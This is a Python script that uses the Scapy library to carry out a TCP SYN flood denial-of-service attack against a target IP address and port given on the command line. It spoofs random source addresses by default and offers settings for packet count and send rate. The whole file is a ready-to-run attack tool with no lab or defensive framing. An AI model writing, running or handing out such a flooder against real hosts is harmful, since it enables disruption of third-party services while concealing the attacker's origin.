#!/usr/bin/env python3

import argparse
import random
import sys
from scapy.all import IP, TCP, send, Ether

def random_ip():
    """Generates a random IP address."""
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def syn_flood(target_ip, target_port, num_packets, spoof_ip=True, send_rate=0):
    """
    Performs a TCP SYN Flood attack.

    Args:
        target_ip (str): The IP address of the target.
        target_port (int): The port number of the target.
        num_packets (int): The number of SYN packets to send.
        spoof_ip (bool): Whether to spoof source IP addresses. Defaults to True.
        send_rate (float): Time interval in seconds between sending packets. Defaults to 0.01.
    """
    print(f"[*] Starting TCP SYN Flood on {target_ip}:{target_port} with {num_packets} packets.")
    if spoof_ip:
        print("[*] Source IP addresses will be spoofed.")
    else:
        print("[*] Using real source IP address.")

    for i in range(num_packets):
        source_ip = random_ip() if spoof_ip else None # Scapy will use host IP if src is None
        source_port = random.randint(1024, 65535)

        # Craft the SYN packet
        if source_ip:
            ip_layer = IP(src=source_ip, dst=target_ip)
        else:
            # Let Scapy fill in the source IP if not spoofing
            # This requires L3RawSocket or similar, ensure script is run with sudo
            ip_layer = IP(dst=target_ip) 

        tcp_layer = TCP(sport=source_port, dport=target_port, flags="S", seq=random.randint(1000,9000))
        
        packet = ip_layer / tcp_layer
        
        send(packet, verbose=False, inter=send_rate) # inter is time between packets
        
        if (i + 1) % 500 == 0:
            print(f"[+] Sent {i + 1}/{num_packets} packets...")

    print(f"\n[+] TCP SYN Flood complete. Sent {num_packets} packets to {target_ip}:{target_port}.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Perform a TCP SYN Flood attack.")
    parser.add_argument("target_ip", help="The IP address of the target.")
    parser.add_argument("target_port", type=int, help="The port number of the target.")
    parser.add_argument("num_packets", type=int, help="The number of SYN packets to send.")
    parser.add_argument("--no_spoof", action="store_false", dest="spoof_ip", 
                        help="Disable source IP spoofing (use actual source IP). Default is to spoof.")
    parser.add_argument("--rate", type=float, default=0.01, 
                        help="Time interval (in seconds) between sending packets. Default: 0.01 (100 packets/sec).")

    args = parser.parse_args()

    if not (0 < args.target_port <= 65535):
        print("[!] Error: Target port must be between 1 and 65535.")
        sys.exit(1)

    if args.num_packets <= 0:
        print("[!] Error: Number of packets must be positive.")
        sys.exit(1)
        
    if args.rate < 0:
        print("[!] Error: Send rate (interval) must be positive.")
        sys.exit(1)

    try:
        syn_flood(args.target_ip, args.target_port, args.num_packets, args.spoof_ip, args.rate)
    except PermissionError:
        print("[!] Error: This script requires root/sudo privileges to send raw packets.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")